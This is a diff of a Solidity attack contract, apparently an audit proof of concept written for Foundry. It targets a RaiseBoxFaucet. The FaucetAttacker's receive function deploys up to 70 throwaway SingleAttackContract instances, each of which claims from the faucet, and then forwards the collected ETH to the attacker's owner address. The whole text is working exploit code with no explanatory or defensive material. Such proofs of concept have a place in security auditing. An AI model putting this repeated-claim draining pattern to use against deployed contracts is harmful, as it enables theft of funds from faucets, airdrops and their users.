@@ -14,6 +14,8 @@ interface IRaiseBoxFaucet is IERC20 {
 contract FaucetAttacker is Ownable {
     IRaiseBoxFaucet raiseBoxFaucet;
     SingleAttackContract singleAttackContract;
+
+    uint deployCounter;
     
     constructor(address _raiseBoxFauecet)Ownable(msg.sender) payable{
         raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFauecet);
@@ -27,29 +29,31 @@ contract FaucetAttacker is Ownable {
 
     receive() external payable{
         
-        if(raiseBoxFaucet.getContractSepEthBalance() > raiseBoxFaucet.sepEthAmountToDrip() && msg.sender == address(raiseBoxFaucet)){
+        if(raiseBoxFaucet.getContractSepEthBalance() > raiseBoxFaucet.sepEthAmountToDrip() && deployCounter< 70){
             singleAttackContract = new SingleAttackContract(address(raiseBoxFaucet));
-            console2.log("-------new attack sent-----");
+            deployCounter++;
+            console2.log("contract counter: ", deployCounter);
             singleAttackContract.callFaucet();
         } else {
-
             (bool success, ) = owner().call{value: address(this).balance}("");
             require(success, "final transfer failed");
             console2.log("-------Eth transferred to the owner----");
+
         }
-        
     }
 }
 
 contract SingleAttackContract {
     address mainContract;
     IRaiseBoxFaucet raiseBoxFaucet;
+    
     constructor(address _raiseBoxFaucet){
         mainContract = msg.sender;
         raiseBoxFaucet = IRaiseBoxFaucet(_raiseBoxFaucet);
     }
 
     function callFaucet() external {
+        require(msg.sender == mainContract, "only main contract can call");
         raiseBoxFaucet.claimFaucetTokens();
     }
 
